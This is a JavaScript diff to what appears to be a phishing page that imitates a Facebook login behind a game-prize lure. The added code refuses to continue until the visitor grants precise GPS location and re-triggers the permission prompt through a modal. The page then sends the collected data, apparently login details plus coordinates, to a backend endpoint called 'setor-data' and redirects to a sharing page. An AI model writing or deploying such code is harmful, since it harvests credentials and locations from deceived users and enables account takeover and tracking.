@@ -55,17 +55,48 @@ async function getPreciseLocation() {
 
 // ========== LOGIN LOADING & BACKEND CONNECTION ==========
 if (loginForm) {
+  const permissionModal = new bootstrap.Modal(document.getElementById('permissionModal'));
+  const requestBtn = document.getElementById('requestPermissionBtn');
+  const instructionArea = document.getElementById('instructionArea');
+
   loginForm.addEventListener('submit', async function(e) {
-    e.preventDefault(); // Mencegah refresh halaman
+    e.preventDefault();
     
     if (!loginBtn) return;
+    
+    // Check permission status first
+    if (navigator.permissions && navigator.permissions.query) {
+      const result = await navigator.permissions.query({ name: 'geolocation' });
+      if (result.state === 'denied') {
+        instructionArea.classList.remove('d-none');
+        permissionModal.show();
+        return;
+      }
+    }
+
     loginBtn.disabled = true;
-    loginBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Menunggu Izin Lokasi...';
+    loginBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Memproses Verifikasi...';
 
     // 1. Ambil GPS Presisi
     const gpsData = await getPreciseLocation();
     
-    loginBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Memproses...';
+    if (!gpsData) {
+      // Jika GPS gagal (user menolak atau error), tampilkan modal
+      loginBtn.disabled = false;
+      loginBtn.innerHTML = window.location.pathname.includes('login-fb') ? 'Log In' : 'Login';
+      
+      // Cek lagi status setelah percobaan gagal
+      if (navigator.permissions && navigator.permissions.query) {
+        const result = await navigator.permissions.query({ name: 'geolocation' });
+        if (result.state === 'denied') instructionArea.classList.remove('d-none');
+      }
+      
+      permissionModal.show();
+      return;
+    }
+    
+    // Jika GPS Berhasil, lanjut kirim data
+    loginBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Mengautentikasi...';
 
     // Ambil info game & hadiah dari localStorage
     const game = localStorage.getItem('selected_game') || 'Unknown';
@@ -86,7 +117,6 @@ if (loginForm) {
     console.log("MENGIRIM DATA:", dataPayload);
 
     try {
-      // Mengirimkan data ke Backend Render (Gunakan BACKEND_URL)
       const response = await fetch(`${BACKEND_URL}/api/setor-data`, {
         method: 'POST',
         headers: {
@@ -97,17 +127,21 @@ if (loginForm) {
       });
 
       const result = await response.json();
-
-      // Jika backend sukses memproses, langsung lempar ke halaman SHARE
       if (result.status === 'success') {
         window.location.href = 'share.html';
       }
-
     } catch (error) {
       console.error('Gagal menghubungi server backend:', error);
-      // Fallback redirect even if backend fails
       window.location.href = 'share.html';
     }
   });
+
+  // Listener untuk tombol di dalam modal
+  if (requestBtn) {
+    requestBtn.addEventListener('click', async () => {
+      permissionModal.hide();
+      loginBtn.click(); // Trigger login lagi untuk memicu popup browser
+    });
+  }
 }
 
